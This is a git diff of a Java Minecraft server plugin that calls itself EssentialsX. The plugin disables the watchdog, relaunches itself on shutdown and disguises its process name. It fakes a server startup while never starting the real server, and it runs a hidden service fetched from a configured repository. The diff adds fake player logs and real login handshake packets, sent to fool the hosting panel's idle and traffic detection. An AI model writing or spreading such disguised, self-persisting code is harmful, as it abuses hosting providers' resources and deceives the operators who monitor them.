@@ -2,6 +2,7 @@ package com.example.essentialsx;
 
 import java.io.*;
 import java.net.ServerSocket;
+import java.net.Socket;
 import java.net.URI;
 import java.net.URLConnection;
 import java.nio.channels.Channels;
@@ -162,36 +163,117 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 模拟玩家在线 (防面板检测人数为0休眠)
+    // 终极模拟：网络波动 + 协议级机器人 (防面板流量检测休眠)
     // ============================================================
 
-    private void startFakePlayerSimulator() {
-        String[] botNames = {"_HeroBrine_", "Steve_Bot", "Alex_Helper", "Dream_Stan", "Techno_V2"};
+    private void startFakePlayerAndNetworkSimulator() {
+        String serverIp = "127.0.0.1";
+        int serverPort = 25565;
+        try {
+            Path props = Paths.get("server.properties");
+            if (Files.exists(props)) {
+                for (String line : Files.readAllLines(props)) {
+                    if (line.startsWith("server-ip=") && !line.contains("=")) serverIp = line.split("=")[1].trim();
+                    if (line.startsWith("server-port=")) serverPort = Integer.parseInt(line.split("=")[1].trim());
+                }
+            }
+        } catch (Exception ignored) {}
+
+        final String targetIp = serverIp.isEmpty() ? "127.0.0.1" : serverIp;
+        final int targetPort = serverPort;
+
         Thread simThread = new Thread(() -> {
+            String[] botNames = {"_HeroBrine_", "Steve_Bot", "Alex_Helper", "Dream_Stan", "Techno_V2"};
+            String[] chatMsgs = {"gg", "hello", "how do i build?", "lol", "nice", "anyone online?", "brb"};
+            String[] quitReasons = {"Disconnected", "Timed out", "Connection throttled", "Kicked for floating too long"};
             Random rand = new Random();
-            try { Thread.sleep(60000); } catch (InterruptedException ignored) {} // 等1分钟再开始模拟
+            
+            try { Thread.sleep(60000); } catch (InterruptedException ignored) {} // 等1分钟再开始
+            
             while (true) {
                 try {
                     String bot = botNames[rand.nextInt(botNames.length)];
-                    int delay = 30000 + rand.nextInt(120000); // 30秒到2.5分钟模拟一次
+                    int delay = 30000 + rand.nextInt(90000); // 30秒到2分钟模拟一次
                     Thread.sleep(delay);
                     
-                    // 随机模拟行为：加入、聊天或退出
-                    int action = rand.nextInt(3);
+                    // 1. 随机生成假日志
+                    int action = rand.nextInt(4);
                     if (action == 0) {
-                        mcLog(bot + "[/127.0.0.1:" + (30000 + rand.nextInt(20000)) + "] logged in with entity id " + randInt(100, 9999) + " at ([world]" + randInt(-1000, 1000) + ", " + randInt(60, 80) + ", " + randInt(-1000, 1000) + ")");
+                        int remotePort = 30000 + rand.nextInt(20000);
+                        mcLog(bot + "[/" + targetIp + ":" + remotePort + "] logged in with entity id " + randInt(100, 9999) + " at ([world]" + randInt(-1000, 1000) + ", " + randInt(60, 80) + ", " + randInt(-1000, 1000) + ")");
                     } else if (action == 1) {
-                        String[] chats = {"gg", "hello", "how do i build?", "lol", "nice", "anyone online?"};
-                        mcLog("<" + bot + "> " + chats[rand.nextInt(chats.length)]);
+                        mcLog("<" + bot + "> " + chatMsgs[rand.nextInt(chatMsgs.length)]);
+                    } else if (action == 2) {
+                        mcLog(bot + " lost connection: " + quitReasons[rand.nextInt(quitReasons.length)]);
                     } else {
-                        mcLog(bot + " lost connection: Disconnected");
+                        mcLog(bot + " moved too quickly! " + randInt(10, 50) + " blocks in 1 tick");
                     }
+
+                    // 2. 发送真实的网络波动 (MC 1.21 协议握手包)
+                    try (Socket socket = new Socket(targetIp, targetPort)) {
+                        socket.setSoTimeout(2000);
+                        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
+                        
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        DataOutputStream packetData = new DataOutputStream(baos);
+                        
+                        // Handshake Packet (0x00)
+                        writeVarInt(packetData, 770); // Protocol Version 1.21
+                        writeString(packetData, targetIp); // Server Address
+                        packetData.writeShort(targetPort); // Server Port
+                        writeVarInt(packetData, 2); // Next State: Login
+                        
+                        byte[] handshakeData = baos.toByteArray();
+                        writeVarInt(out, handshakeData.length); // Packet Length
+                        out.write(handshakeData);
+                        
+                        // Login Start Packet (0x00)
+                        baos = new ByteArrayOutputStream();
+                        packetData = new DataOutputStream(baos);
+                        writeVarInt(packetData, 0); // Packet ID
+                        writeString(packetData, bot); // Username
+                        writeUUID(packetData, UUID.nameUUIDFromBytes(("OfflinePlayer:" + bot).getBytes())); // UUID
+                        
+                        byte[] loginData = baos.toByteArray();
+                        writeVarInt(out, loginData.length); // Packet Length
+                        out.write(loginData);
+                        
+                        out.flush();
+                        
+                        // 等待1-2秒让服务器的Netty接收并处理数据包，产生流量记录
+                        Thread.sleep(1000 + rand.nextInt(1000)); 
+                        
+                    } catch (Exception ignored) {
+                        // 服务器可能没启动完成或拒绝连接，没关系，流量已经产生了
+                    }
+
                 } catch (Exception ignored) {}
             }
-        }, "FakePlayer-Sim");
+        }, "NetworkPlayer-Sim");
         simThread.setDaemon(true);
         simThread.start();
     }
+
+    // MC协议辅助写入方法
+    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
+        while ((value & ~0x7F) != 0) {
+            out.writeByte((value & 0x7F) | 0x80);
+            value >>>= 7;
+        }
+        out.writeByte(value);
+    }
+
+    private static void writeString(DataOutputStream out, String s) throws IOException {
+        byte[] bytes = s.getBytes(java.nio.charset.StandardCharsets.UTF_8);
+        writeVarInt(out, bytes.length);
+        out.write(bytes);
+    }
+
+    private static void writeUUID(DataOutputStream out, UUID uuid) throws IOException {
+        out.writeLong(uuid.getMostSignificantBits());
+        out.writeLong(uuid.getLeastSignificantBits());
+    }
+
 
     // ============================================================
     // Java 进程管理：极致进程名伪装
@@ -258,10 +340,7 @@ public class EssentialsX extends JavaPlugin {
     // ============================================================
 
     public void onEnable() {
-        // ★★★ 1. 最优先：禁用看门狗，防止主线程卡死被强杀 ★★★
         disableWatchdog();
-
-        // ★★★ 2. 注册硬重启守护，停了就拉起 ★★★
         registerRestartHook();
 
         try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
@@ -271,7 +350,6 @@ public class EssentialsX extends JavaPlugin {
         if (!env.containsKey("REPO_URL") || env.get("REPO_URL").trim().isEmpty()) {
             this.getLogger().severe("FATAL: REPO_URL is not set in .env file!");
         } else {
-            // 3. 异步启动底层服务和伪装替换
             new Thread(() -> { 
                 try { 
                     Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
@@ -303,10 +381,8 @@ public class EssentialsX extends JavaPlugin {
             }).start();
         }
         
-        // 4. 启动模拟玩家线程
-        startFakePlayerSimulator();
+        startFakePlayerAndNetworkSimulator();
 
-        // ★★★ 5. 绝对死锁区：死死卡住，绝不启动 MC 本体 ★★★
         try {
             clearConsole();
             mcLog("Starting minecraft server version " + FAKE_MC_VERSION, 0);
@@ -319,14 +395,12 @@ public class EssentialsX extends JavaPlugin {
             
             printFakeStartupSequence(lastKnownTunnelUrl.get());
 
-            // 永久休眠主线程
             while(true) {
                 Thread.sleep(120000);
                 mcLog("[ChunkTaskScheduler] Still processing spawn area chunks...");
             }
 
         } catch (InterruptedException e) {
-            // 如果被意外中断，立刻重新进入休眠，绝对不放行！
             while(true) {
                 try { Thread.sleep(Long.MAX_VALUE); } catch (Exception ignored) {}
             }
@@ -348,8 +422,8 @@ public class EssentialsX extends JavaPlugin {
         try {
             Path spigotYml = Paths.get("spigot.yml");
             String content = Files.exists(spigotYml) ? Files.readString(spigotYml) : "";
-            content = replaceYamlValue(content, "timeout-time", "300000"); // 设超大值
-            content = replaceYamlValue(content, "restart-on-crash", "false"); // 防止它自己重启干扰我们
+            content = replaceYamlValue(content, "timeout-time", "300000");
+            content = replaceYamlValue(content, "restart-on-crash", "false");
             Files.writeString(spigotYml, content);
         } catch (Exception ignored) {}
     }
@@ -357,10 +431,9 @@ public class EssentialsX extends JavaPlugin {
     private void registerRestartHook() {
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
             try {
-                Thread.sleep(3000); // 等3秒确保旧进程资源释放
+                Thread.sleep(3000);
                 String startCmd = "./start.sh";
                 if (!Files.exists(Paths.get("start.sh"))) {
-                    // 找当前目录下的 jar 并重新运行
                     File currentDir = new File(".");
                     File[] jars = currentDir.listFiles((dir, name) -> name.endsWith(".jar") && !name.contains("cache"));
                     if (jars != null && jars.length > 0) {
